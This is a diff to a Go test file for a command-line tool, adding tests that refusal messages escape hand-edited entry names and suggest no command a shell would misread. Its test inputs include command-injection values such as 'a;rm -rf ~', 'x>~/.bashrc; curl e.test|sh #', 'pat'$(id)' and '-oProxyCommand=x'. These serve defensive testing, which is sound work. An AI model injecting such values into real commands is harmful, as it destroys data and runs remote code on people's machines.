@@ -7,11 +7,14 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/json"
 	"encoding/pem"
 	"errors"
+	"fmt"
 	"math/big"
 	"os"
 	"path/filepath"
+	"slices"
 	"strings"
 	"testing"
 	"time"
@@ -362,8 +365,8 @@ func TestEntryRefusedMessages(t *testing.T) {
 				`nothing was saved. Upgrade the server to 0.10.0, then retry.`},
 		{&EntryRefusedError{Entry: "shed", Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: "pat"},
 			"the server issued a certificate for user \"admin\", but entry \"shed\" is held to user \"pat\"; nothing was saved.\n" +
-				"ssh offered a key that belongs to \"admin\". To stay \"pat\", let this entry offer only pat's key " +
-				"(shed server update shed --identity-file <pat's private key>) and retry.\n" +
+				"ssh offered a key that belongs to \"admin\". To stay \"pat\", let this entry offer only the private key of user \"pat\" " +
+				"(shed server update shed --identity-file /path/to/key, with that key's path in place of /path/to/key) and retry.\n" +
 				"To make this entry \"admin\": shed server update shed --refetch --allow-user-change"},
 		{&EntryRefusedError{Entry: "shed", Kind: RefusedEntryChanged},
 			`entry "shed" changed while this command ran; nothing was saved. Run it again.`},
@@ -407,14 +410,270 @@ func TestEntryRefusedMessages(t *testing.T) {
 
 // TestStoredTokenRefusalEscapesTheEntryName: an entry name edited by hand into
 // config.yaml can hold an escape sequence; the stored-token refusal shows it
-// escaped everywhere, the suggested command included, never raw.
+// escaped, and suggests no command line a person would paste with it.
 func TestStoredTokenRefusalEscapesTheEntryName(t *testing.T) {
 	name := "srv\x1b[31m"
 	msg := StoredTokenRefusal(name, &ServerEntry{IdentityFile: "/home/pat/.ssh/id_work"}).Error()
 	if strings.ContainsRune(msg, '\x1b') {
 		t.Errorf("the refusal carries a raw ESC: %q", msg)
 	}
-	if !strings.Contains(msg, `shed server update srv\x1b[31m --refetch`) {
-		t.Errorf("the suggested command does not show the name escaped: %q", msg)
+	if strings.Contains(msg, "shed server update srv") {
+		t.Errorf("the refusal suggests a command line with a name that cannot be pasted: %q", msg)
+	}
+	if !strings.Contains(msg, `run shed server update for the entry "srv\x1b[31m" with --refetch`) {
+		t.Errorf("the advice does not name the entry escaped: %q", msg)
+	}
+}
+
+// shellWordTable is the hand-written table of the pasteable-word rule that the
+// Rust core's shell_server_name is held to as well.
+const shellWordTable = "../../crates/fixtures/shellword/cases.json"
+
+// TestShellWordSharedTable holds ShellWord to the one table both languages
+// read (crates/fixtures/shellword/cases.json), so it cannot drift from the
+// Rust core's shell_server_name: the same names are bare, quoted or refused.
+func TestShellWordSharedTable(t *testing.T) {
+	data, err := os.ReadFile(filepath.FromSlash(shellWordTable))
+	if err != nil {
+		t.Fatalf("read the shared table: %v", err)
+	}
+	var table struct {
+		Cases []struct {
+			Name string  `json:"name"`
+			Word *string `json:"word"`
+		} `json:"cases"`
+	}
+	if err := json.Unmarshal(data, &table); err != nil {
+		t.Fatalf("decode %s: %v", shellWordTable, err)
+	}
+	if len(table.Cases) < 40 {
+		t.Fatalf("the shared table holds only %d cases", len(table.Cases))
+	}
+	for _, tc := range table.Cases {
+		got, ok := ShellWord(tc.Name)
+		switch {
+		case tc.Word == nil && ok:
+			t.Errorf("ShellWord(%q) = %q, true; want no pasteable word", tc.Name, got)
+		case tc.Word != nil && (!ok || got != *tc.Word):
+			t.Errorf("ShellWord(%q) = %q, %v; want %q, true", tc.Name, got, ok, *tc.Word)
+		}
+	}
+	// Bytes that are not UTF-8 cannot be written in the JSON table (nor held
+	// by a Rust &str); Go refuses them like any other byte above 0x7E.
+	for _, in := range []string{"a\xffb", "\xc3", "shed\xe0\xae"} {
+		if got, ok := ShellWord(in); ok {
+			t.Errorf("ShellWord(%q) = %q, true; want no pasteable word", in, got)
+		}
+	}
+}
+
+// shellSplit reads the command that starts at cmd the way a POSIX shell reads
+// a pasted line: words split at unquoted blanks, `'…'` and `"…"` quoted, `\x`
+// escaped, up to the first unquoted `,` or line break (where a message's
+// sentence goes on) or the end. It returns the words and every character the
+// shell would treat as syntax (outside quotes: a metacharacter, a glob, a
+// tilde, a comment, a history or brace character; inside double quotes: an
+// expansion). A safe suggestion has none.
+func shellSplit(cmd string) (words []string, syntax string) {
+	const meta = "|&;<>()$`*?[]#~!{}\t"
+	var (
+		word    strings.Builder
+		inWord  bool
+		quote   rune
+		escaped bool
+	)
+	flush := func() {
+		if inWord {
+			words = append(words, word.String())
+		}
+		word.Reset()
+		inWord = false
+	}
+	for _, c := range cmd {
+		switch {
+		case escaped:
+			word.WriteRune(c)
+			escaped = false
+		case quote == '\'':
+			if c == '\'' {
+				quote = 0
+			} else {
+				word.WriteRune(c)
+			}
+		case quote == '"':
+			switch c {
+			case '"':
+				quote = 0
+			case '$', '`', '\\':
+				syntax += string(c)
+				word.WriteRune(c)
+			default:
+				word.WriteRune(c)
+			}
+		case c == '\'' || c == '"':
+			quote, inWord = c, true
+		case c == '\\':
+			// An escaped character is literal (the `\'` of `'\''`).
+			escaped, inWord = true, true
+		case c == ' ':
+			flush()
+		case c == ',' || c == '\n':
+			flush()
+			return words, syntax
+		default:
+			if strings.ContainsRune(meta, c) {
+				syntax += string(c)
+			}
+			word.WriteRune(c)
+			inWord = true
+		}
+	}
+	if quote != 0 || escaped {
+		syntax += "<unterminated>"
+	}
+	flush()
+	return words, syntax
+}
+
+// suggestedCommands returns each `shed server update` command line msg
+// suggests, from its first word to where the sentence goes on. The advice in
+// words ("run shed server update for the entry …") is not a command line.
+func suggestedCommands(msg string) []string {
+	const cmd = "shed server update "
+	var out []string
+	for i := 0; ; {
+		j := strings.Index(msg[i:], cmd)
+		if j < 0 {
+			return out
+		}
+		at := i + j
+		if !strings.HasSuffix(msg[:at], "run ") {
+			out = append(out, msg[at:])
+		}
+		i = at + len(cmd)
+	}
+}
+
+// TestRefusalsNeverPrintAHostileEntryName: every refusal that suggests a
+// command naming the entry shows the name escaped, quotes it for the shell
+// when it can be pasted as one word, and otherwise gives the advice in words
+// with no command line. A hand-edited name with a line break, an ESC
+// sequence, a `;` or a leading `-` never reaches the terminal raw and is never
+// pasteable as something else. Each suggested command is split as a shell
+// would split it: it is exactly the intended argv, with no shell syntax.
+func TestRefusalsNeverPrintAHostileEntryName(t *testing.T) {
+	kinds := []struct {
+		name  string
+		err   func(entry string) *EntryRefusedError
+		forms []updateForm
+	}{
+		{"stored no user", func(n string) *EntryRefusedError {
+			return &EntryRefusedError{Entry: n, Kind: RefusedStoredNoUser}
+		}, []updateForm{updateRefetch}},
+		{"stored user mismatch", func(n string) *EntryRefusedError {
+			return &EntryRefusedError{Entry: n, Kind: RefusedStoredUserMismatch, CertUser: "pat"}
+		}, []updateForm{updateRefetch}},
+		{"issued user change", func(n string) *EntryRefusedError {
+			return &EntryRefusedError{Entry: n, Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: "pat"}
+		}, []updateForm{updateIdentityFile, updateAllowUserChange}},
+		{"restore failed", func(n string) *EntryRefusedError {
+			return &EntryRefusedError{Entry: n, Kind: RefusedRestoreFailed, Cause: errors.New("disk full")}
+		}, []updateForm{updateRefetch}},
+		{"mint-only unrecorded", func(n string) *EntryRefusedError {
+			return &EntryRefusedError{Entry: n, Kind: RefusedMintOnlyUnrecorded, CertUser: "pat"}
+		}, []updateForm{updateRefetch}},
+		{"stored token for key", func(n string) *EntryRefusedError {
+			return StoredTokenRefusal(n, &ServerEntry{IdentityFile: "/home/pat/.ssh/id_work"})
+		}, []updateForm{updateRefetch}},
+	}
+	formArgv := map[updateForm][]string{
+		updateRefetch:         {"--refetch"},
+		updateIdentityFile:    {"--identity-file", "/path/to/key"},
+		updateAllowUserChange: {"--refetch", "--allow-user-change"},
+	}
+	for _, k := range kinds {
+		t.Run(k.name, func(t *testing.T) {
+			// Names a pasted word can carry: each suggested command is exactly
+			// `shed server update <name> <form>`, with no shell syntax.
+			for _, entry := range []string{"shed", "a;rm -rf ~", "x>~/.bashrc; curl e.test|sh #", "it's", "a,b) ; id"} {
+				msg := k.err(entry).Error()
+				cmds := suggestedCommands(msg)
+				if len(cmds) != len(k.forms) {
+					t.Fatalf("%q: %d suggested commands, want %d: %q", entry, len(cmds), len(k.forms), msg)
+				}
+				for i, cmd := range cmds {
+					words, syntax := shellSplit(cmd)
+					if syntax != "" {
+						t.Errorf("%q: the suggested command holds shell syntax %q: %q", entry, syntax, cmd)
+					}
+					want := append([]string{"shed", "server", "update", entry}, formArgv[k.forms[i]]...)
+					if !slices.Equal(words, want) {
+						t.Errorf("%q: a shell reads the suggested command as %q, want %q (%q)", entry, words, want, cmd)
+					}
+				}
+			}
+
+			// Names no pasted word can carry: the advice in words, the name escaped.
+			for _, hostile := range []string{"a\nb", "srv\x1b[2J", "-oProxyCommand=x", "shedா"} {
+				msg := k.err(hostile).Error()
+				if strings.ContainsAny(hostile, "\n\x1b") && strings.Contains(msg, hostile) {
+					t.Errorf("%q reached the message raw: %q", hostile, msg)
+				}
+				if strings.ContainsRune(msg, '\x1b') {
+					t.Errorf("%q: a raw ESC in the message: %q", hostile, msg)
+				}
+				if cmds := suggestedCommands(msg); len(cmds) != 0 {
+					t.Errorf("%q: a command line names it: %q", hostile, cmds)
+				}
+				if want := fmt.Sprintf("run shed server update for the entry %q with --", hostile); !strings.Contains(msg, want) {
+					t.Errorf("%q: the advice in words is missing (%q): %q", hostile, want, msg)
+				}
+			}
+		})
+	}
+
+	// The user an entry is held to also comes from config.yaml: it is named
+	// escaped in the sentence and never reaches a suggested command, whose key
+	// path is a fixed placeholder (the review's held-user value).
+	for _, held := range []string{"x>~/.bashrc; curl e.test|sh #", "pat\x1b[2J", "pat'$(id)"} {
+		msg := (&EntryRefusedError{Entry: "shed", Kind: RefusedIssuedUserChange, CertUser: "admin", EntryUser: held}).Error()
+		if strings.ContainsRune(msg, '\x1b') {
+			t.Errorf("the held user reached the message raw: %q", msg)
+		}
+		if !strings.Contains(msg, fmt.Sprintf("only the private key of user %q (", held)) {
+			t.Errorf("the sentence does not name the held user escaped: %q", msg)
+		}
+		cmds := suggestedCommands(msg)
+		if len(cmds) != 2 {
+			t.Fatalf("%d suggested commands, want 2: %q", len(cmds), msg)
+		}
+		for i, cmd := range cmds {
+			words, syntax := shellSplit(cmd)
+			want := append([]string{"shed", "server", "update", "shed"}, formArgv[[]updateForm{updateIdentityFile, updateAllowUserChange}[i]]...)
+			if syntax != "" || !slices.Equal(words, want) {
+				t.Errorf("held user %q: a shell reads the suggested command as %q (syntax %q), want %q: %q",
+					held, words, syntax, want, cmd)
+			}
+		}
+	}
+}
+
+// TestShellSplitCatchesTheOldInterpolation is the splitter's negative
+// control: the command the held-user refusal built before (the held user in
+// the key path) is caught, and so is an unquoted name.
+func TestShellSplitCatchesTheOldInterpolation(t *testing.T) {
+	for _, cmd := range []string{
+		"shed server update shed --identity-file <x>~/.bashrc; curl e.test|sh #'s private key>) and retry.",
+		"shed server update a;rm -rf ~ --refetch",
+		"shed server update shed --identity-file <key>",
+		`shed server update "a$(id)" --refetch`,
+	} {
+		if _, syntax := shellSplit(cmd); syntax == "" {
+			t.Errorf("shellSplit(%q) found no shell syntax", cmd)
+		}
+	}
+	words, syntax := shellSplit("shed server update 'it'\\''s' --refetch, then")
+	if syntax != "" || !slices.Equal(words, []string{"shed", "server", "update", "it's", "--refetch"}) {
+		t.Errorf("shellSplit of a quoted word = %q, syntax %q", words, syntax)
 	}
 }
